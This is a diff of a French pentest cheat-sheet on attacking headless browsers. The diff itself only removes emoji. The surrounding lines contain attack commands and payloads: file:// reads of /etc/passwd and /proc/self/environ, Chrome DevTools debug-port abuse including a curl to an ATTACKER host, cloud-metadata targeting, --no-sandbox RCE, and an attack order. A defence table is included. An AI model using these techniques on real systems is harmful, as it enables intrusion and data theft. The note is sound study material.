@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🖥️ Headless Browser — attaques
+# Headless Browser — attaques
 
 > [!info] **En 1 phrase**
 > Un headless browser = un navigateur (Chrome, Firefox, Edge) **sans interface graphique**, pilotable par
@@ -24,7 +24,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -35,7 +35,7 @@ flowchart LR
     B --> F[RCE si --no-sandbox<br>+ CVE V8/Blink]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Un headless est un **vrai navigateur complet** : il interprète HTML/CSS/JS, navigue, stocke cookies,
 > suit les redirections. Mais il tourne souvent **en root, sans sandbox**, avec des **flags d'autorisation
 > dangereux** et/ou un **port de debug ouvert** → chaque fonctionnalité "rend une page" devient une surface d'attaque.
@@ -61,7 +61,7 @@ flowchart LR
 
 ---
 
-## 🚀 Commandes headless
+## Commandes headless
 
 ```bash
 # Chrome / Chromium
@@ -78,11 +78,11 @@ firefox --headless --screenshot https://target.com
 
 ---
 
-## 🕳️ Lecture de fichiers locaux (file://)
+## Lecture de fichiers locaux (file://)
 
 ### Flags dangereux
 
-> [!warning] ⚠️ Si la cible est lancée avec `--allow-file-access` (ou `--allow-file-access-from-files`),
+> [!warning] Si la cible est lancée avec `--allow-file-access` (ou `--allow-file-access-from-files`),
 > une **page distante peut lire des fichiers locaux** via `fetch("file://...")`.
 
 ```bash
@@ -124,7 +124,7 @@ google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run \
 
 ---
 
-## 🔌 Remote Debugging Port (CDP)
+## Remote Debugging Port (CDP)
 
 Le **Chrome DevTools Protocol** est exposé sur un TCP port (défaut **9222**, modifiable avec
 `--remote-debugging-port=`). Quiconque y accède **contrôle totalement le navigateur** : navigation
@@ -167,12 +167,12 @@ curl http://127.0.0.1:9222/json/new?https://ATTACKER/   # créer un onglet (scan
 - **LFI** : via CDP `Page.navigate` vers `file://` + `Runtime.evaluate` (scripts dédiés : `chrome_remote_debug_lfi.py`).
 - **Node inspector** (`--inspect`) : onglets CDP équivalents → évaluation JS = **exécution de code** sur le serveur.
 
-> [!note] 📌 Chrome ≥ 136 (mars 2025) : `--remote-debugging-port` / `--remote-debugging-pipe` sont **ignorés** sur le
+> [!note] Chrome ≥ 136 (mars 2025) : `--remote-debugging-port` / `--remote-debugging-pipe` sont **ignorés** sur le
 > data-dir par défaut de Chrome → il faut un `--user-data-dir` non standard. Vérifier que le data-dir n'est pas celui par défaut.
 
 ---
 
-## 🕸️ Attaques réseau depuis le headless
+## Attaques réseau depuis le headless
 
 ### Port scanning (timing)
 
@@ -193,7 +193,7 @@ curl http://127.0.0.1:9222/json/new?https://ATTACKER/   # créer un onglet (scan
 
 ---
 
-## 💥 RCE via le headless
+## RCE via le headless
 
 ### `--no-sandbox` = la porte
 
@@ -204,7 +204,7 @@ process navigateur** (souvent root en Docker/CI).
 ```js
 // Pattern vulnérable extrêmement répandu dans les apps "admin bot" / screenshot
 const browser = await puppeteer.launch({
-    args: ['--no-sandbox']          // ⚠️ sandbox désactivée
+    args: ['--no-sandbox']          // sandbox désactivée
 });
 ```
 
@@ -224,7 +224,7 @@ const browser = await puppeteer.launch({
 
 ---
 
-## 🤖 Exploitation d'un endpoint qui rend une page
+## Exploitation d'un endpoint qui rend une page
 
 > Contexte : l'app prend une **URL en entrée** et la rend avec le headless (PDF, screenshot, préview).
 > On contrôle l'URL et/ou son contenu → on exploite les schémas supportés par le navigateur.
@@ -263,13 +263,13 @@ google-chrome --headless --dump-dom http://127.0.0.1:PORT/json/version
 google-chrome --headless --screenshot /tmp/out.png http://10.0.0.1/admin
 ```
 
-> [!warning] ⚠️ Limitations à connaître : Chrome bloque par défaut les **ports connus**
+> [!warning] Limitations à connaître : Chrome bloque par défaut les **ports connus**
 > (SMTP, SOCKS...) et l'accès au **réseau local non-localhost** (Private Network Access).
 > `127.0.0.1` reste accessible → c'est la cible numéro 1.
 
 ---
 
-## 📦 PoC / scripts
+## PoC / scripts
 
 ### Puppeteer (Node.js) — usage légitime & exploitation
 
@@ -277,7 +277,7 @@ google-chrome --headless --screenshot /tmp/out.png http://10.0.0.1/admin
 // Usage légitime : screenshot + PDF
 const puppeteer = require("puppeteer");
 (async () => {
-  const browser = await puppeteer.launch({ args: ["--no-sandbox"] }); // ⚠️ flag RCE
+  const browser = await puppeteer.launch({ args: ["--no-sandbox"] }); // flag RCE
   const page = await browser.newPage();
   await page.goto("https://target/", { waitUntil: "networkidle0" });
   await page.screenshot({ path: "screen.png" });
@@ -292,7 +292,7 @@ const puppeteer = require("puppeteer");
 from playwright.sync_api import sync_playwright
 
 with sync_playwright() as p:
-    browser = p.chromium.launch(args=["--no-sandbox"])   # ⚠️
+    browser = p.chromium.launch(args=["--no-sandbox"])   #
     page = browser.new_page()
     page.goto("http://target/")
     page.screenshot(path="screen.png")
@@ -336,12 +336,12 @@ async def exploit():
 asyncio.run(exploit())
 ```
 
-> [!tip] 💡 Si la connexion WebSocket échoue avec un `origin` invalide : Chrome ≥ déc. 2022 exige
+> [!tip] Si la connexion WebSocket échoue avec un `origin` invalide : Chrome ≥ déc. 2022 exige
 > `--remote-allow-origins="*"` côté cible, OU un client qui envoie un **header origin vide** (fix de `ripWCMN.py`).
 
 ---
 
-## 🧰 Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -355,7 +355,7 @@ asyncio.run(exploit())
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Mesure | Détail |
 |---|---|
@@ -370,44 +370,44 @@ asyncio.run(exploit())
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!warning] ⚠️ **`--no-sandbox` = porte ouverte**
+> [!warning] `--no-sandbox` = porte ouverte**
 > Le flag désactive le sandbox du renderer : n'importe quelle exécution de code dans la page
 > (XSS + CVE V8/Blink, WASM, parsing) devient un **RCE complet** avec les droits du process navigateur
 > (souvent root en Docker/CI). On le voit partout "pour que le headless marche en CI" → **le premier truc à checker**.
 
-> [!warning] ⚠️ **Port de debug exposé = contrôle total**
+> [!warning] **Port de debug exposé = contrôle total**
 > Un `--remote-debugging-port` ouvert (9222) ou un `node --inspect` (9229) donne la main sur **tout**
 > le navigateur : onglets, cookies, sessions, navigation `file://`, exécution JS, `--restore-last-session`.
 > Voir un 9222/9229 ouvert = s'y connecter immédiatement. Même principe avec Node/Electron/CEF.
 
-> [!tip] 💡 **`file://` = lecture locale**
+> [!tip] `file://` = lecture locale**
 > Par défaut `file://` est interdit depuis une page http — mais les flags d'autorisation
 > (`--allow-file-access`, `--allow-file-access-from-files`) et les endpoints `--print-to-pdf`
 > (`javascript:window.location="/etc/passwd"`, `<iframe src="/etc/passwd">`) le permettent.
 > Tester aussi `file:///etc/passwd`, `file:///C:/Windows/win.ini` (Windows), `file:///proc/self/environ`.
 
-> [!tip] 💡 **Contraintes réseau du navigateur**
+> [!tip] **Contraintes réseau du navigateur**
 > Chrome bloque les ports "connus" (SMTP, SOCKS...) et le réseau privé non-localhost (PNA). Mais
 > `127.0.0.1` reste accessible → port scanning timing + DNS rebinding (singularity) sont les voies
 > pour atteindre l'interne. Penser aux metadata cloud (`169.254.169.254`) quand le headless est dans un cloud.
 
-> [!warning] ⚠️ **Chrome ≥ 136 (mars 2025)**
+> [!warning] **Chrome ≥ 136 (mars 2025)**
 > `--remote-debugging-port` / `--remote-debugging-pipe` sont **ignorés** si on vise le data-dir par défaut
 > de Chrome → le debug nécessite un `--user-data-dir` non standard. Vérifier quelle version + quels flags.
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Identifier le headless (User-Agent `HeadlessChrome/`, `chrome://version`) → 2. tester les schémas
 > `file://`, `javascript:`, `data:`, `chrome://` sur l'URL rendue → 3. scanner les ports locaux (9222/9229,
 > métadonnées cloud) → 4. CDP : cookies, navigation, LFI → 5. CVE V8/Blink + `--no-sandbox` = RCE.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[SSRF|🌐 SSRF]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Headless Browsers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Headless%20Browsers/README.md)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[SSRF| SSRF]]
+- [[Injection de commandes| Injection de commandes]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Headless Browsers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Headless%20Browsers/README.md)
